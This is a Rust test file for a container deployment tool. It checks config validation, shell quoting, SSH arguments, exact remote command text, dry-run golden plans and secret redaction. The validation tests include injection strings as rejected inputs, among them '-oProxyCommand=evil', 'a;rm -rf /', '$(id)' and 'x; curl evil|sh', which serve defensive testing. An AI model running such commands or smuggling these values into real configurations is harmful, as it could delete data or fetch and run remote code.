//! `forge deploy` without hosts: configuration validation (including
//! injection attempts), exact command text and argv, the golden plans
//! shared with Forge-Go, failure paths and redaction.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use forge_proxy::GoDuration;
use forge_proxy::clock::Timestamp;

use super::cli::{Common, DeployAction, Factory, Io, LockAction, run_deploy};
use super::commands::{Commands, RemoteCommand, join, quote};
use super::config::{Config, DEFAULT_CONFIG_PATH, all_patterns, publish_spec};
use super::deployer::{Container, Deployer, LogWriter, Parts, parse_inventory};
use super::errors::{
    EXIT_HOOK_FAILED, EXIT_INCONSISTENT, EXIT_LOCK_HELD, EXIT_MIGRATION_FAILED, EXIT_UNHEALTHY,
    LOCK_HELD_EXIT_STATUS, RemoteError,
};
use super::init::{default_service_name, init};
use super::operations::{Boot, apply_boot};
use super::remote::{ExecOptions, LogsOptions};
use super::runner::{Cancel, LocalRunner, Output, RunError, Runner, Sink, SshRunner};
use super::secrets::{REDACTED, Secrets};

/// Forge-Go's `validConfig` fixture, verbatim.
const VALID_CONFIG: &str = r#"
service: shop
image: registry.example.com/acme/shop
registry:
  server: registry.example.com
  username: acme
  password: REGISTRY_PASSWORD
servers:
  web:
    hosts: [192.0.2.10, 192.0.2.11]
  jobs:
    hosts: [192.0.2.11]
    cmd: [jobs]
    env:
      clear:
        WORKERS: "4"
env:
  clear:
    FORGE_ENV: production
  secret: [FORGE_DATABASE_URL]
volumes: ["shop-storage:/app/storage"]
proxy:
  image: registry.example.com/forge-proxy@sha256:1111111111111111111111111111111111111111111111111111111111111111
  hosts: [Shop.Example.com]
  ssl: true
  healthcheck:
    interval: 500ms
accessories:
  db:
    image: postgres:18-alpine
    host: 192.0.2.20
    port: 5432
    volumes: ["shop-pg:/var/lib/postgresql"]
    env:
      secret: [POSTGRES_PASSWORD]
builder:
  platform: linux/amd64
  args:
    GO_VERSION: "1.27"
retain: 3
ssh:
  user: deploy
  port: 2222
  proxy_jump: ops@bastion.example.com
"#;

fn parse(text: &str) -> Config {
    Config::parse(text.as_bytes()).unwrap_or_else(|error| panic!("{error}"))
}

#[test]
fn every_pattern_compiles() {
    for pattern in all_patterns() {
        assert!(
            regex_automata::meta::Regex::new(pattern.source()).is_ok(),
            "{}",
            pattern.source()
        );
    }
}

#[test]
fn parse_applies_defaults() {
    let config = parse(VALID_CONFIG);
    assert_eq!(config.primary_role(), "web");
    assert!(config.proxied("web") && !config.proxied("jobs"));
    assert_eq!(config.roles(), ["web", "jobs"]);
    assert_eq!(config.app_hosts(), ["192.0.2.10", "192.0.2.11"]);
    assert_eq!(
        config.all_hosts(),
        ["192.0.2.10", "192.0.2.11", "192.0.2.20"]
    );
    assert_eq!(config.roles_on("192.0.2.11"), ["web", "jobs"]);
    assert_eq!(
        config.secret_names(),
        [
            "FORGE_DATABASE_URL",
            "POSTGRES_PASSWORD",
            "REGISTRY_PASSWORD"
        ]
    );
    let proxy = &config.proxy;
    assert_eq!(proxy.hosts, ["shop.example.com"]);
    assert_eq!(proxy.app_port, 8080);
    assert_eq!(proxy.healthcheck.path, "/health/ready");
    assert_eq!(proxy.healthcheck.interval, GoDuration::from_millis(500));
    assert_eq!(proxy.healthcheck.healthy_count, 3);
    assert_eq!(proxy.drain_timeout, GoDuration::from_secs(30));
    assert_eq!(config.retain, 3);
    assert_eq!(config.stop_timeout, GoDuration::from_secs(35));
    assert_eq!(config.parallelism, 4);
    assert_eq!(config.hooks, ".forge/hooks");
    assert_eq!(config.migrate.enabled, Some(true));
    assert_eq!(config.migrate.role, "web");
    assert_eq!(config.migrate.cmd, ["migrate"]);
    assert_eq!(config.builder.context, ".");
    assert_eq!(config.builder.dockerfile, "Dockerfile");
    assert_eq!(
        config.accessories["db"].port, "5432",
        "integer port read as string"
    );
}

#[test]
fn parse_rejects_invalid_configurations() {
    let replace = |old: &str, new: &str| {
        assert!(VALID_CONFIG.contains(old), "fixture lacks {old:?}");
        VALID_CONFIG.replacen(old, new, 1)
    };
    let with = |extra: &str| format!("{VALID_CONFIG}{extra}");
    let cases: Vec<(&str, String, &str)> = vec![
        ("empty", String::new(), "empty"),
        ("comments only", "# nothing\n".to_owned(), "empty"),
        (
            "unknown key",
            with("colour: blue\n"),
            "field colour not found",
        ),
        (
            "unknown nested key",
            replace("  ssl: true", "  ssl: true\n  tls_mode: strict"),
            "field tls_mode not found",
        ),
        ("duplicate key", with("retain: 4\n"), "already defined"),
        (
            "two documents",
            with("---\nservice: other\n"),
            "exactly one YAML document",
        ),
        (
            "bad service",
            replace("service: shop", "service: Shop_App"),
            "service must match",
        ),
        (
            "image with tag",
            replace(
                "image: registry.example.com/acme/shop",
                "image: registry.example.com/acme/shop:latest",
            ),
            "must not include a tag",
        ),
        (
            "image with digest",
            replace(
                "image: registry.example.com/acme/shop",
                "image: registry.example.com/acme/shop@sha256:abc",
            ),
            "image:",
        ),
        (
            "password inline",
            replace("password: REGISTRY_PASSWORD", "password: hunter2!"),
            "must name a secret",
        ),
        (
            "user without pass",
            replace("  password: REGISTRY_PASSWORD\n", ""),
            "must be set together",
        ),
        (
            "no servers",
            replace("servers:", "unused_servers:"),
            "field unused_servers not found",
        ),
        (
            "role without hosts",
            replace(
                "    hosts: [192.0.2.11]\n    cmd: [jobs]",
                "    cmd: [jobs]",
            ),
            "servers.jobs.hosts must list",
        ),
        (
            "option injection",
            replace(
                "hosts: [192.0.2.10, 192.0.2.11]",
                "hosts: [-oProxyCommand=evil]",
            ),
            "not a valid host",
        ),
        (
            "shell injection host",
            replace("hosts: [192.0.2.10, 192.0.2.11]", "hosts: [\"a;rm -rf /\"]"),
            "not a valid host",
        ),
        (
            "command substitution host",
            replace("hosts: [192.0.2.10, 192.0.2.11]", "hosts: [\"$(id)\"]"),
            "not a valid host",
        ),
        (
            "duplicate host",
            replace(
                "hosts: [192.0.2.10, 192.0.2.11]",
                "hosts: [192.0.2.10, 192.0.2.10]",
            ),
            "listed twice",
        ),
        (
            "two proxy roles",
            replace("    cmd: [jobs]", "    cmd: [jobs]\n    proxy: true"),
            "only one role",
        ),
        (
            "bad env key",
            replace("FORGE_ENV: production", "FORGE-ENV: production"),
            "not a valid variable name",
        ),
        (
            "env key injection",
            replace("FORGE_ENV: production", "\"A=1 B\": production"),
            "not a valid variable name",
        ),
        (
            "clear and secret",
            replace("FORGE_ENV: production", "FORGE_DATABASE_URL: plain"),
            "both clear and secret",
        ),
        (
            "bad volume",
            replace(
                "volumes: [\"shop-storage:/app/storage\"]",
                "volumes: [\"../etc:/etc\"]",
            ),
            "volumes",
        ),
        (
            "volume option",
            replace(
                "volumes: [\"shop-storage:/app/storage\"]",
                "volumes: [\"--privileged:/x\"]",
            ),
            "volumes",
        ),
        (
            "proxy without image",
            replace(
                "  image: registry.example.com/forge-proxy@sha256:1111111111111111111111111111111111111111111111111111111111111111\n",
                "",
            ),
            "proxy.image is required",
        ),
        (
            "proxy image injection",
            replace(
                "image: registry.example.com/forge-proxy@sha256:1111111111111111111111111111111111111111111111111111111111111111",
                "image: \"x; curl evil|sh\"",
            ),
            "proxy.image is required",
        ),
        (
            "ssl without hosts",
            replace("  hosts: [Shop.Example.com]\n", ""),
            "proxy.ssl requires",
        ),
        (
            "ip proxy host",
            replace("hosts: [Shop.Example.com]", "hosts: [192.0.2.10]"),
            "not a DNS name",
        ),
        (
            "numeric duration",
            replace("interval: 500ms", "interval: 5"),
            "duration must be a string",
        ),
        (
            "bad duration",
            replace("interval: 500ms", "interval: soon"),
            "invalid duration",
        ),
        (
            "negative retain",
            replace("retain: 3", "retain: -1"),
            "retain must be",
        ),
        (
            "health path",
            replace("interval: 500ms", "interval: 500ms\n    path: health?x=1"),
            "healthcheck.path",
        ),
        (
            "migrate role",
            with("migrate:\n  role: worker\n"),
            "migrate.role",
        ),
        (
            "accessory port",
            replace("port: 5432", "port: 99999"),
            "not a port number",
        ),
        (
            "accessory bind",
            replace("port: 5432", "port: \"public:1:2\""),
            "bind address",
        ),
        (
            "accessory host",
            replace("host: 192.0.2.20", "host: ''"),
            "accessories.db.host",
        ),
        (
            "accessory image injection",
            replace("image: postgres:18-alpine", "image: \"postgres; reboot\""),
            "accessories.db.image",
        ),
        (
            "platform",
            replace("platform: linux/amd64", "platform: amd64"),
            "builder.platform",
        ),
        (
            "build arg control",
            replace("GO_VERSION: \"1.27\"", "GO_VERSION: \"1.27\\n--x\""),
            "builder.args.GO_VERSION",
        ),
        (
            "ssh user",
            replace("user: deploy", "user: 'root; rm'"),
            "ssh.user",
        ),
        (
            "proxy jump",
            replace(
                "proxy_jump: ops@bastion.example.com",
                "proxy_jump: '-oProxyCommand=x'",
            ),
            "ssh.proxy_jump",
        ),
        ("parallelism", with("parallelism: 500\n"), "parallelism"),
        (
            "stop timeout",
            with("stop_timeout: 1h\n"),
            "stop_timeout must be between 1s and 10m0s",
        ),
        (
            "proxy unused",
            replace("  web:\n", "  web:\n    proxy: false\n"),
            "no role uses it",
        ),
        (
            "control char in cmd",
            replace("cmd: [jobs]", "cmd: [\"jobs\\n\"]"),
            "control character",
        ),
        (
            "multiline clear env",
            replace("WORKERS: \"4\"", "WORKERS: \"4\\n5\""),
            "single line",
        ),
        (
            "duplicate secret",
            replace(
                "secret: [FORGE_DATABASE_URL]",
                "secret: [FORGE_DATABASE_URL, FORGE_DATABASE_URL]",
            ),
            "listed twice",
        ),
        (
            "wrong type for hosts",
            replace("hosts: [192.0.2.10, 192.0.2.11]", "hosts: 192.0.2.10"),
            "cannot unmarshal",
        ),
        (
            "anchor",
            with("hooks: &h .forge/hooks\n"),
            "anchors are not supported",
        ),
        ("tag", with("hooks: !!str x\n"), "tags are not supported"),
    ];
    for (name, config, want) in cases {
        let error = Config::parse(config.as_bytes()).expect_err(name);
        assert!(
            error.contains(want),
            "{name}: error = {error}, want it to mention {want:?}"
        );
    }
}

#[test]
fn publish_spec_binds_loopback_by_default() {
    for (input, want) in [
        ("5432", Some("127.0.0.1:5432:5432")),
        ("6543:5432", Some("127.0.0.1:6543:5432")),
        ("10.0.0.5:6543:5432", Some("10.0.0.5:6543:5432")),
        ("0.0.0.0:6379:6379", Some("0.0.0.0:6379:6379")),
        ("[::1]:1:2", None),
        ("5432:5432:5432:5432", None),
        ("x", None),
    ] {
        assert_eq!(publish_spec(input).ok().as_deref(), want, "{input}");
    }
}

#[test]
fn quote_makes_one_shell_word() {
    for (input, want) in [
        ("plain", "plain"),
        ("a b", "'a b'"),
        ("it's", r"'it'\''s'"),
        ("", "''"),
        ("$(rm -rf /)", "'$(rm -rf /)'"),
        ("label=forge.role=web", "label=forge.role=web"),
        ("{{json .}}", "'{{json .}}'"),
        ("semi;colon", "'semi;colon'"),
        ("/usr/local/bin/x", "/usr/local/bin/x"),
        ("back`tick`", "'back`tick`'"),
        ("new\nline", "'new\nline'"),
        ("--name=a,b@c%d+e:f.g/", "--name=a,b@c%d+e:f.g/"),
    ] {
        assert_eq!(quote(input), want, "{input:?}");
    }
    assert_eq!(join(&["echo", "a b", "c"]), "echo 'a b' c");
}

/// Every quoted word reaches a real POSIX shell as exactly one argument.
#[test]
fn quoted_words_survive_a_real_shell() {
    let words = [
        "a b", "it's", "$(id)", "`id`", "a;b", "x\ny", "*", "~", "\"q\"", "\\", "$HOME", "--x=1",
    ];
    for word in words {
        let script = format!("printf '%s' {}", quote(word));
        let output = std::process::Command::new("sh")
            .args(["-c", &script])
            .output()
            .expect("sh runs");
        assert_eq!(String::from_utf8_lossy(&output.stdout), word, "{word:?}");
    }
}

#[test]
fn proxied_role_trusts_the_forge_network_unless_configured() {
    let config = parse(VALID_CONFIG);
    let commands = Commands::new(config.clone());
    let web = commands.run_role("web", "v1", "shop-web-v1-a").script;
    assert!(
        web.starts_with("forge_proxies=$(docker network inspect --format "),
        "{web}"
    );
    assert!(
        web.contains(" --env \"FORGE_HTTP_TRUSTED_PROXIES=$forge_proxies\" "),
        "{web}"
    );
    assert!(web.contains("[ -n \"$forge_proxies\" ] || {"), "{web}");
    let jobs = commands.run_role("jobs", "v1", "shop-jobs-v1-a").script;
    assert!(
        !jobs.contains("FORGE_HTTP_TRUSTED_PROXIES") && !jobs.contains("forge_proxies"),
        "{jobs}"
    );
    let mut global = config.clone();
    global
        .env
        .clear
        .insert("FORGE_HTTP_TRUSTED_PROXIES".into(), "10.0.0.0/8".into());
    let mut role = config.clone();
    if let Some(web) = role.servers.get_mut("web") {
        web.env
            .clear
            .insert("FORGE_HTTP_TRUSTED_PROXIES".into(), String::new());
    }
    let mut secret = config;
    secret.env.secret.push("FORGE_HTTP_TRUSTED_PROXIES".into());
    for (name, config) in [
        ("global clear", global),
        ("role clear", role),
        ("secret", secret),
    ] {
        let script = Commands::new(config)
            .run_role("web", "v1", "shop-web-v1-a")
            .script;
        assert!(!script.contains("forge_proxies"), "{name}: {script}");
    }
}

#[test]
fn ssh_argv_matches_forge_go_and_never_relaxes_host_keys() {
    let config = parse(VALID_CONFIG);
    let runner = SshRunner::new(&config.ssh);
    let args = runner.command_args(
        Path::new("/tmp/forge-ssh-x"),
        "192.0.2.10",
        "docker ps",
        false,
    );
    assert_eq!(
        args,
        [
            "-o",
            "ControlMaster=auto",
            "-o",
            "ControlPath=/tmp/forge-ssh-x/%C",
            "-o",
            "ControlPersist=60",
            "-o",
            "ConnectTimeout=10",
            "-o",
            "ServerAliveInterval=15",
            "-o",
            "ServerAliveCountMax=3",
            "-o",
            "BatchMode=yes",
            "-T",
            "-l",
            "deploy",
            "-p",
            "2222",
            "-J",
            "ops@bastion.example.com",
            "--",
            "192.0.2.10",
            "sh -c 'docker ps'",
        ]
    );
    let interactive = runner.command_args(Path::new("/c"), "h", "sh", true);
    assert!(
        interactive.contains(&"-t".to_owned())
            && !interactive.contains(&"BatchMode=yes".to_owned())
    );
    let all = args.join(" ");
    assert!(!all.contains("StrictHostKeyChecking") && !all.contains("UserKnownHostsFile"));
    // The host is after `--`, so a name can never become an option.
    assert_eq!(args[args.len() - 3], "--");
}

#[test]
fn ssh_refuses_invalid_hosts_before_starting_ssh() {
    let runner = SshRunner::new(&super::config::Ssh::default());
    let error = runner
        .run(
            &Cancel::never(),
            "-oProxyCommand=evil",
            &RemoteCommand::default(),
        )
        .expect_err("refused");
    assert_eq!(
        error,
        RunError::Other("invalid host \"-oProxyCommand=evil\"".to_owned())
    );
}

#[test]
fn command_text_is_exact() {
    let commands = Commands::new(parse(VALID_CONFIG));
    let login = commands.registry_login(b"registry-secret-1");
    assert_eq!(
        login.script,
        "docker login registry.example.com --username acme --password-stdin"
    );
    assert_eq!(login.stdin.as_deref(), Some(&b"registry-secret-1"[..]));
    assert!(!login.script.contains("registry-secret-1"));
    let upload = commands.upload_role_env(
        "jobs",
        &Secrets::from_values([("FORGE_DATABASE_URL", "postgres://x")]),
    );
    assert_eq!(
        upload.script,
        "umask 077 && mkdir -p .forge/shop/env && cat > .forge/shop/env/jobs.env.tmp && mv .forge/shop/env/jobs.env.tmp .forge/shop/env/jobs.env"
    );
    assert_eq!(
        String::from_utf8(upload.stdin.expect("stdin")).expect("utf-8"),
        "FORGE_ENV=production\nWORKERS=4\nFORGE_DATABASE_URL=postgres://x\n"
    );
    assert_eq!(
        commands.proxy_deploy("shop-web-v3-a").script,
        "docker exec forge-proxy /usr/local/bin/forge-proxy deploy -service shop -target shop-web-v3-a:8080 -hosts shop.example.com -tls -health-path /health/ready -health-interval 500ms -health-timeout 2s -healthy-count 3 -deploy-timeout 1m0s -drain-timeout 30s -response-timeout 30s -max-body-bytes 67108864"
    );
    assert_eq!(
        commands.logs("web", true, "1h", 10).script,
        "c=$(docker ps --latest --quiet --filter label=forge.service=shop --filter label=forge.role=web --filter status=running); [ -n \"$c\" ] || { echo \"no running web container\" >&2; exit 1; }; exec 3<&0; docker logs --timestamps --follow --since 1h --tail 10 \"$c\" 2>&1 & p=$!; { read -r _ <&3; kill \"$p\" 2>/dev/null; } & w=$!; wait \"$p\"; s=$?; kill \"$w\" 2>/dev/null; exit \"$s\""
    );
    assert_eq!(
        commands.exec_one_off("web", &["migrate".into(), "it's".into()], false),
        "c=$(docker ps --latest --quiet --filter label=forge.service=shop --filter label=forge.role=web --filter status=running); [ -n \"$c\" ] || { echo \"no running web container\" >&2; exit 1; }; i=$(docker inspect --format '{{.Config.Image}}' \"$c\") && docker run --rm --network forge --env-file .forge/shop/env/web.env --volume shop-storage:/app/storage \"$i\" migrate 'it'\\''s'"
    );
    assert!(commands.debug_shell("web", "busybox:1.37").ends_with(
        "docker run --rm --interactive --tty --network \"container:$c\" --pid \"container:$c\" busybox:1.37 sh"
    ));
}

/// Records commands and answers read-only queries from fixtures.
#[derive(Clone, Default)]
struct FakeRunner {
    calls: Arc<Mutex<Vec<String>>>,
    inventory: Arc<Mutex<HashMap<String, String>>>,
    images: Arc<Mutex<HashMap<String, String>>>,
    /// Scripts starting with a prefix answer with this stdout.
    answers: Arc<Mutex<Vec<(String, String)>>>,
    #[allow(clippy::type_complexity)]
    fail: Arc<Mutex<Option<Box<dyn Fn(&str, &RemoteCommand) -> Option<RunError> + Send + Sync>>>>,
}

impl FakeRunner {
    fn calls(&self) -> Vec<String> {
        self.calls.lock().expect("lock").clone()
    }

    fn fail_with(
        &self,
        fail: impl Fn(&str, &RemoteCommand) -> Option<RunError> + Send + Sync + 'static,
    ) {
        *self.fail.lock().expect("lock") = Some(Box::new(fail));
    }
}

impl Runner for FakeRunner {
    fn run(
        &self,
        _cancel: &Cancel,
        host: &str,
        command: &RemoteCommand,
    ) -> Result<Output, RunError> {
        self.calls
            .lock()
            .expect("lock")
            .push(format!("{host}: {}", command.script));
        if let Some(fail) = self.fail.lock().expect("lock").as_ref()
            && let Some(error) = fail(host, command)
        {
            return Err(error);
        }
        let stdout = if command.script.starts_with("docker ps --all") {
            self.inventory
                .lock()
                .expect("lock")
                .get(host)
                .cloned()
                .unwrap_or_default()
        } else if command.script.starts_with("docker image ls") {
            self.images
                .lock()
                .expect("lock")
                .get(host)
                .cloned()
                .unwrap_or_default()
        } else {
            self.answers
                .lock()
                .expect("lock")
                .iter()
                .find(|(prefix, _)| command.script.starts_with(prefix.as_str()))
                .map(|(_, stdout)| stdout.clone())
                .unwrap_or_default()
        };
        Ok(Output {
            stdout,
            stderr: String::new(),
        })
    }

    fn stream(
        &self,
        _cancel: &Cancel,
        host: &str,
        command: &RemoteCommand,
        _out: &dyn Sink,
    ) -> Result<(), RunError> {
        self.calls
            .lock()
            .expect("lock")
            .push(format!("{host}: {}", command.script));
        Ok(())
    }

    fn interactive(&self, _cancel: &Cancel, host: &str, script: &str) -> Result<(), RunError> {
        self.calls
            .lock()
            .expect("lock")
            .push(format!("{host}: {script}"));
        Ok(())
    }

    fn close(&self) {}
}

/// Records local commands instead of running them.
#[derive(Clone, Default)]
struct RecordingLocal {
    calls: Arc<Mutex<Vec<Vec<String>>>>,
}

impl LocalRunner for RecordingLocal {
    fn output(&self, _cancel: &Cancel, _dir: &Path, argv: &[String]) -> Result<String, String> {
        Err(format!("unexpected local query {argv:?}"))
    }

    fn run(
        &self,
        _cancel: &Cancel,
        _dir: &Path,
        argv: &[String],
        _stdin: Option<&[u8]>,
        _env: &[(String, String)],
    ) -> Result<(), String> {
        self.calls.lock().expect("lock").push(argv.to_vec());
        Ok(())
    }
}

#[derive(Clone, Default)]
struct Buffer(Arc<Mutex<Vec<u8>>>);

impl std::io::Write for Buffer {
    fn write(&mut self, data: &[u8]) -> std::io::Result<usize> {
        self.0.lock().expect("lock").extend_from_slice(data);
        Ok(data.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

impl Buffer {
    fn text(&self) -> String {
        String::from_utf8_lossy(&self.0.lock().expect("lock")).into_owned()
    }

    fn writer(&self) -> LogWriter {
        Arc::new(Mutex::new(Box::new(self.clone())))
    }
}

/// 2026-10-19T12:00:00Z, Forge-Go's `planEpoch`.
fn plan_epoch() -> Timestamp {
    Timestamp {
        unix_seconds: 1_792_411_200,
        nanos: 0,
        offset_seconds: 0,
    }
}

fn ps_json(name: &str, role: &str, version: &str, state: &str, created: Timestamp) -> String {
    let line = serde_json::json!({
        "Names": name, "State": state, "Image": format!("registry.example.com/acme/shop:{version}"),
        "Labels": format!("forge.role={role},forge.service=shop,forge.version={version}"),
        "CreatedAt": created.docker(),
    });
    format!("{line}\n")
}

fn image_json(tag: &str) -> String {
    format!("{{\"Repository\":\"registry.example.com/acme/shop\",\"Tag\":{tag:?}}}\n")
}

const PLAN_SECRETS: [(&str, &str); 3] = [
    ("REGISTRY_PASSWORD", "registry-secret-1"),
    ("FORGE_DATABASE_URL", "postgres://shop:db-secret-2@db/shop"),
    ("POSTGRES_PASSWORD", "pg-secret-3"),
];

struct Fixture {
    deployer: Deployer,
    runner: FakeRunner,
    local: RecordingLocal,
    log: Buffer,
    _root: tempfile::TempDir,
}

/// Forge-Go's `planFixture`: web on .10 and .11, jobs on .11; v2 is live,
/// v1 and v0 are retained; retain is 2.
fn plan_fixture(dry_run: bool) -> Fixture {
    let config = parse(&VALID_CONFIG.replacen("retain: 3", "retain: 2", 1));
    let hour = Duration::from_secs(3600);
    let at = |hours_ago: u32| {
        let mut stamp = plan_epoch();
        stamp.unix_seconds -= i64::from(hours_ago) * i64::try_from(hour.as_secs()).unwrap_or(0);
        stamp
    };
    let inventory = |role: &str| {
        ps_json(
            &format!("shop-{role}-v2-bbbbbb"),
            role,
            "v2",
            "running",
            at(1),
        ) + &ps_json(
            &format!("shop-{role}-v1-aaaaaa"),
            role,
            "v1",
            "exited",
            at(2),
        ) + &ps_json(
            &format!("shop-{role}-v0-999999"),
            role,
            "v0",
            "exited",
            at(3),
        )
    };
    let runner = FakeRunner::default();
    runner.inventory.lock().expect("lock").extend([
        ("192.0.2.10".to_owned(), inventory("web")),
        (
            "192.0.2.11".to_owned(),
            inventory("web") + &inventory("jobs"),
        ),
    ]);
    runner.images.lock().expect("lock").extend([
        (
            "192.0.2.10".to_owned(),
            image_json("v3") + &image_json("v2") + &image_json("v1") + &image_json("v0"),
        ),
        (
            "192.0.2.11".to_owned(),
            image_json("v2") + &image_json("v1") + &image_json("v0") + &image_json("<none>"),
        ),
    ]);
    let local = RecordingLocal::default();
    let log = Buffer::default();
    let root = tempfile::tempdir().expect("tempdir");
    let counter = Arc::new(Mutex::new(0_u32));
    let deployer = Deployer::new(Parts {
        config,
        secrets: Secrets::from_values(PLAN_SECRETS),
        runner: Box::new(runner.clone()),
        local: Box::new(local.clone()),
        root: root.path().to_owned(),
        log: log.writer(),
        performer: Some("alice@laptop".to_owned()),
        now: Some(Box::new(plan_epoch)),
        suffix: Some(Box::new(move || {
            let mut counter = counter.lock().expect("lock");
            *counter += 1;
            format!("{:06}", *counter)
        })),
        dry_run,
    });
    Fixture {
        deployer,
        runner,
        local,
        log,
        _root: root,
    }
}

fn check_golden(name: &str, got: &str) {
    let path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures/deploy")
        .join(format!("{name}.golden"));
    if std::env::var_os("FORGE_BLESS").is_some() {
        std::fs::write(&path, got).expect("write golden");
    }
    let want = std::fs::read_to_string(&path).expect("golden file");
    assert!(
        got == want,
        "{name} plan differs from {} (Forge-Go's golden; rerun with FORGE_BLESS=1 after review):\n{got}",
        path.display()
    );
    for (_, secret) in PLAN_SECRETS {
        assert!(!got.contains(secret), "{name} plan leaks a secret");
    }
}

#[test]
fn golden_deploy_plan_matches_forge_go() {
    let fixture = plan_fixture(true);
    let (_, result) = fixture.deployer.deploy(&Cancel::never(), "v3", false);
    result.expect("dry-run deploy");
    drop(fixture.deployer);
    check_golden("deploy", &fixture.log.text());
    for call in fixture.runner.calls() {
        let script = call.split_once(": ").map_or("", |(_, s)| s);
        assert!(
            script.starts_with("docker ps --all") || script.starts_with("docker image ls"),
            "dry run executed a mutating command: {call}"
        );
    }
}

#[test]
fn golden_rollback_plan_matches_forge_go() {
    let fixture = plan_fixture(true);
    fixture
        .deployer
        .rollback(&Cancel::never(), "v1")
        .1
        .expect("dry-run rollback");
    drop(fixture.deployer);
    check_golden("rollback", &fixture.log.text());
}

#[test]
fn golden_prune_plan_matches_forge_go() {
    let fixture = plan_fixture(true);
    fixture
        .deployer
        .prune(&Cancel::never())
        .1
        .expect("dry-run prune");
    drop(fixture.deployer);
    check_golden("prune", &fixture.log.text());
}

#[test]
fn golden_setup_plan_matches_forge_go() {
    let fixture = plan_fixture(true);
    let (report, result) = fixture.deployer.setup(&Cancel::never());
    result.expect("dry-run setup");
    assert!(
        report.expect("report").warnings.is_empty(),
        "digest-pinned proxy image warned"
    );
    drop(fixture.deployer);
    check_golden("setup", &fixture.log.text());
}

#[test]
fn deploy_report_build_argv_and_pruning() {
    let fixture = plan_fixture(false);
    let (report, result) = fixture.deployer.deploy(&Cancel::never(), "v3", false);
    result.expect("deploy");
    let report = report.expect("report");
    let local = fixture.local.calls.lock().expect("lock").clone();
    assert_eq!(local.len(), 3, "{local:?}");
    assert_eq!(
        local[0],
        [
            "docker",
            "login",
            "registry.example.com",
            "--username",
            "acme",
            "--password-stdin"
        ]
    );
    assert_eq!(
        local[1],
        [
            "docker",
            "build",
            "--tag",
            "registry.example.com/acme/shop:v3",
            "--file",
            "Dockerfile",
            "--label",
            "forge.service=shop",
            "--label",
            "forge.version=v3",
            "--platform",
            "linux/amd64",
            "--build-arg",
            "GO_VERSION=1.27",
            ".",
        ]
    );
    assert_eq!(
        local[2],
        ["docker", "push", "registry.example.com/acme/shop:v3"]
    );
    assert_eq!(report.steps.len(), 3);
    assert_eq!(report.steps[0].container, "shop-web-v3-000002");
    assert_eq!(report.steps[0].stopped, ["shop-web-v2-bbbbbb"]);
    for pruned in [
        "192.0.2.10:registry.example.com/acme/shop:v0",
        "192.0.2.10:registry.example.com/acme/shop:v1",
        "192.0.2.10:shop-web-v1-aaaaaa",
        "192.0.2.10:shop-web-v0-999999",
    ] {
        assert!(
            report.pruned.iter().any(|p| p == pruned),
            "pruned {:?} lacks {pruned}",
            report.pruned
        );
    }
    let calls = fixture.runner.calls().join("\n");
    assert!(
        !calls.contains("image rm registry.example.com/acme/shop:v3"),
        "pruned the image just deployed"
    );
    assert!(
        calls.contains("cat >> .forge/shop/deploys.log"),
        "deploy not recorded"
    );
    let json = serde_json::to_value(&report).expect("json");
    assert_eq!(json["schema_version"], 1);
    assert_eq!(json["action"], "deploy");
    assert_eq!(json["version"], "v3");
}

#[test]
fn deploy_log_entry_and_lock_record_are_forge_go_json() {
    let fixture = plan_fixture(false);
    // Capture stdin of the log append and the lock record.
    let records = Arc::new(Mutex::new(Vec::new()));
    let seen = Arc::clone(&records);
    fixture.runner.fail_with(move |host, command| {
        if command.script.contains("deploys.log") || command.script.contains("lock/info;") {
            seen.lock()
                .expect("lock")
                .push((host.to_owned(), command.stdin.clone().unwrap_or_default()));
        }
        None
    });
    fixture
        .deployer
        .deploy(&Cancel::never(), "v3", true)
        .1
        .expect("deploy");
    let records = records.lock().expect("lock").clone();
    let lock = records
        .iter()
        .find(|(_, stdin)| String::from_utf8_lossy(stdin).contains("holder"))
        .expect("lock record");
    assert_eq!(
        String::from_utf8_lossy(&lock.1),
        "{\"holder\":\"alice@laptop\",\"message\":\"deploy v3\",\"acquired_at\":\"2026-10-19T12:00:00Z\"}\n"
    );
    let entry = records
        .iter()
        .find(|(host, stdin)| {
            host == "192.0.2.11" && String::from_utf8_lossy(stdin).contains("performer")
        })
        .expect("log entry");
    assert_eq!(
        String::from_utf8_lossy(&entry.1),
        "{\"action\":\"deploy\",\"containers\":{\"jobs\":\"shop-jobs-v3-000004\",\"web\":\"shop-web-v3-000003\"},\"host\":\"192.0.2.11\",\"performer\":\"alice@laptop\",\"service\":\"shop\",\"time\":\"2026-10-19T12:00:00Z\",\"version\":\"v3\"}\n"
    );
}

#[test]
fn failing_hook_aborts_before_remote_changes() {
    let fixture = plan_fixture(false);
    // A real local runner, so the hook executes.
    let mut deployer = fixture.deployer;
    deployer.local = Box::new(super::runner::ExecLocal);
    let hooks = deployer.root.join(".forge/hooks");
    std::fs::create_dir_all(&hooks).expect("hooks");
    let marker = deployer.root.join("hook-env");
    let script = format!(
        "#!/bin/sh\nenv | grep '^FORGE_' | sort > {}\nexit 3\n",
        marker.display()
    );
    let hook = hooks.join("pre-deploy");
    std::fs::write(&hook, script).expect("hook");
    {
        use std::os::unix::fs::PermissionsExt as _;
        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o700)).expect("chmod");
    }
    let error = deployer
        .deploy(&Cancel::never(), "v3", true)
        .1
        .expect_err("hook fails");
    assert_eq!(error.exit_code(), EXIT_HOOK_FAILED, "{error}");
    assert!(error.message.contains("hook pre-deploy failed"), "{error}");
    let dump = std::fs::read_to_string(&marker).expect("hook ran");
    for want in [
        "FORGE_COMMAND=deploy",
        "FORGE_VERSION=v3",
        "FORGE_SERVICE=shop",
        "FORGE_HOSTS=192.0.2.10,192.0.2.11",
        "FORGE_ROLES=web,jobs",
        "FORGE_PERFORMER=alice@laptop",
        "FORGE_IMAGE=registry.example.com/acme/shop:v3",
    ] {
        assert!(dump.contains(want), "hook env lacks {want}:\n{dump}");
    }
    for call in fixture.runner.calls() {
        assert!(
            call.contains(".forge/shop/lock"),
            "remote command ran after the hook failed: {call}"
        );
    }
    {
        use std::os::unix::fs::PermissionsExt as _;
        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o600)).expect("chmod");
    }
    let error = deployer
        .deploy(&Cancel::never(), "v3", true)
        .1
        .expect_err("not executable");
    assert_eq!(error.exit_code(), EXIT_HOOK_FAILED);
    assert!(error.message.contains("not executable"), "{error}");
}

fn remote(host: &str, code: i32, stderr: &str) -> RunError {
